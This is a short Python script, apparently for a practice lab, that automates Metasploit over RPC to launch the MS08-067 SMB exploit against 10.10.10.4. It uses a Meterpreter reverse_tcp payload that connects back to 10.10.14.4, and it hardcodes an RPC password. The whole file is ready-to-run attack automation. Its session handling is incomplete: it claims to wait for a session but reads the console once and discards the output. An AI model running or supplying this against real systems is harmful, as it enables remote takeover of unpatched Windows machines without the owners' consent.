
import re
from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcMethod

class ExploitRunner:
    def __init__(self, password, server, port, exploit, payload, rhost, lhost):
        self.client = MsfRpcClient(password=password, server=server, port=port)
        self.exploit = exploit
        self.payload = payload
        self.rhost = rhost
        self.lhost = lhost

    def run_exploit(self):
        try:
            console = self.client.call(MsfRpcMethod.ConsoleCreate)
            cid = console['id']
            msf_console = self.client.consoles.console(cid)

            # Set exploit and options
            msf_console.write(f"use {self.exploit}\n")
            msf_console.write(f"set RHOSTS {self.rhost}\n")
            msf_console.write(f"set LHOST {self.lhost}\n")
            msf_console.write(f"set PAYLOAD {self.payload}\n")
            msf_console.write("exploit -j\n")  # Run in the background

            # Wait for a session to be created
            output = msf_console.read()


            # Destroy the console session
            self.client.call(MsfRpcMethod.ConsoleDestroy, [cid])

        except Exception as e:
            print(f"Exploit execution failed: {e}")

# Usage
runner = ExploitRunner(
    password="glycNshR",
    server="127.0.0.1",
    port=55555,
    exploit="exploit/windows/smb/ms08_067_netapi",
    payload="windows/meterpreter/reverse_tcp",
    rhost="10.10.10.4",
    lhost="10.10.14.4"
)

runner.run_exploit()
